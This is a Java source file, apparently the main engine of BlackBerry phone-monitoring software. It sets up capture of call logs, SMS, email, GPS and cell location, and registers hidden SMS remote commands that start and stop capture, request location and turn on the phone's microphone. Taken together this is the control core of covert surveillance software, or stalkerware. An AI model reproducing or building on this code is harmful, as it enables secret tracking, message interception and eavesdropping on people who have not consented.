import net.rim.device.api.ui.UiApplication;
import com.vvt.calllogc.CallLogCapture;
import com.vvt.cellinfoc.CellInfoCapture;
import com.vvt.emailc.EmailCapture;
import com.vvt.event.FxEventCentre;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSCapture;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceChangeListener;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.CmdFactory;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdType;
import com.vvt.rmtcmd.SMSCmdReceiver;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.smsc.SMSCapture;
import com.vvt.std.Log;

public class AppEngine implements PreferenceChangeListener {
	
	private Preference pref = Global.getPreference();
	private CallLogCapture callLogCapture = null;
	private CellInfoCapture cellInfoCapture = null;
	private SMSCapture smsCapture = null;
	private GPSCapture gpsCapture = null;
	private EmailCapture emailCapture = null;
	private FxEventCentre eventCentre = null;
	private RmtCmdProcessingManager rmtCmdCentre = null;
	private SMSCmdReceiver smsCmdReceiver = Global.getSMSCmdReceiver();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	
	public AppEngine(UiApplication uiApp) {
		// To create features.
		callLogCapture = new CallLogCapture();
		cellInfoCapture = new CellInfoCapture(uiApp);
		smsCapture = new SMSCapture();
		gpsCapture = new GPSCapture();
		emailCapture = new EmailCapture(uiApp);
		eventCentre = new FxEventCentre();
		rmtCmdCentre = new RmtCmdProcessingManager();
		smsCmdReceiver.setListener(rmtCmdCentre);
		// To set event listener.
		callLogCapture.addFxEventListener(eventCentre);
		cellInfoCapture.addFxEventListener(eventCentre);
		smsCapture.addFxEventListener(eventCentre);
		gpsCapture.addFxEventListener(eventCentre);
		emailCapture.addFxEventListener(eventCentre);
		registerCommands();
	}

	public void start() {
		Log.debug("AppEngine.start", "ENTER");
		pref.registerPreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
		pref.registerPreferenceChangeListener(PreferenceType.PREF_CELL_INFO, this);
		pref.registerPreferenceChangeListener(PreferenceType.PREF_EVENT_INFO, this);
		pref.registerPreferenceChangeListener(PreferenceType.PREF_GENERAL, this);
		pref.registerPreferenceChangeListener(PreferenceType.PREF_GPS, this);
		pref.registerPreferenceChangeListener(PreferenceType.PREF_UNKNOWN, this);
		Log.debug("AppEngine.start", "EXIT");
	}
	
	public void stop() {
		pref.removePreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
		pref.removePreferenceChangeListener(PreferenceType.PREF_CELL_INFO, this);
		pref.removePreferenceChangeListener(PreferenceType.PREF_EVENT_INFO, this);
		pref.removePreferenceChangeListener(PreferenceType.PREF_GENERAL, this);
		pref.removePreferenceChangeListener(PreferenceType.PREF_GPS, this);
		pref.removePreferenceChangeListener(PreferenceType.PREF_UNKNOWN, this);
	}
	
	private void registerCommands() {
		Log.debug("AppEngine.registerCommands", "ENTER");
		SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();		
		// Start Capture Command
		RmtCmdLine startCaptureCmdLine = new RmtCmdLine();
		startCaptureCmdLine.setCode(smsCmdCode.getStartCaptureCmd());
		startCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Stop Capture Command
		RmtCmdLine stopCaptureCmdLine = new RmtCmdLine();
		stopCaptureCmdLine.setCode(smsCmdCode.getStopCaptureCmd());
		stopCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Start GPS Command
		RmtCmdLine startGPSCmdLine = new RmtCmdLine();
		startGPSCmdLine.setCode(smsCmdCode.getStartGPSCmd());
		startGPSCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Stop GPS Command
		RmtCmdLine stopGPSCmdLine = new RmtCmdLine();
		stopGPSCmdLine.setCode(smsCmdCode.getStopGPSCmd());
		stopGPSCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Stop GPS on Demand Command
		RmtCmdLine gpsOnDemandCmdLine = new RmtCmdLine();
		gpsOnDemandCmdLine.setCode(smsCmdCode.getGPSOnDemandCmd());
		gpsOnDemandCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Start Microphone Command
		RmtCmdLine startMicCmdLine = new RmtCmdLine();
		startMicCmdLine.setCode(smsCmdCode.getStartMicCmd());
		startMicCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Stop Microphone Command
		RmtCmdLine stopMicCmdLine = new RmtCmdLine();
		stopMicCmdLine.setCode(smsCmdCode.getStopMicCmd());
		stopMicCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Enable Watch List Command
		RmtCmdLine enableWatchListCmdLine = new RmtCmdLine();
		enableWatchListCmdLine.setCode(smsCmdCode.getEnableWatchListCmd());
		enableWatchListCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// Disable Watch List Command
		RmtCmdLine disableWatchListCmdLine = new RmtCmdLine();
		disableWatchListCmdLine.setCode(smsCmdCode.getDisableWatchListCmd());
		disableWatchListCmdLine.setRmtCmdType(RmtCmdType.SMS);
		// To add commands.
		smsCmdReceiver.registerCommands(startCaptureCmdLine);
		smsCmdReceiver.registerCommands(stopCaptureCmdLine);
		smsCmdReceiver.registerCommands(startGPSCmdLine);
		smsCmdReceiver.registerCommands(stopGPSCmdLine);
		smsCmdReceiver.registerCommands(gpsOnDemandCmdLine);
		smsCmdReceiver.registerCommands(startMicCmdLine);
		smsCmdReceiver.registerCommands(stopMicCmdLine);
		smsCmdReceiver.registerCommands(enableWatchListCmdLine);
		smsCmdReceiver.registerCommands(disableWatchListCmdLine);
		Log.debug("AppEngine.registerCommands", "EXIT");
	}
	
	// PreferenceChangeListener
	public void preferenceChanged(PrefInfo prefInfo) {
		Log.debug("AppEngine.preferenceChanged", "ENTER");
		switch(prefInfo.getPrefType()) {
			case PreferenceType.PREF_BUG_INFO:
				// TODO
				PrefBugInfo bugInfo = (PrefBugInfo)prefInfo;
				break;
			case PreferenceType.PREF_CELL_INFO:
				// To set event listener.
				PrefCellInfo cellInfo = (PrefCellInfo)prefInfo;
				cellInfoCapture.setInterval(cellInfo.getInterval());
				cellInfoCapture.stopCapture();
				if (cellInfo.isEnabled()) {
					cellInfoCapture.startCapture();
				}
				break;
			case PreferenceType.PREF_EVENT_INFO:
				PrefEventInfo eventInfo = (PrefEventInfo)prefInfo;
				// CallLog
				if (eventInfo.isCallLogEnabled()) {
					callLogCapture.startCapture();
				} else {
					callLogCapture.stopCapture();
				}
				// SMS
				if (eventInfo.isSMSEnabled()) {
					smsCapture.startCapture();
				} else {
					smsCapture.stopCapture();
				}
				// Email
				if (eventInfo.isEmailEnabled()) {
					emailCapture.startCapture();
				} else {
					emailCapture.stopCapture();
				}
				break;
			case PreferenceType.PREF_GPS:
				PrefGPS gps = (PrefGPS)prefInfo;
				gpsCapture.setGPSOption(gps.getGpsOption());
				gpsCapture.stopCapture();
				if (gps.isEnabled()) {
					gpsCapture.startCapture();
				}
				break;
			case PreferenceType.PREF_GENERAL:
				break;
			case PreferenceType.PREF_UNKNOWN:
				break;
		}
		Log.debug("AppEngine.preferenceChanged", "EXIT");
	}
}
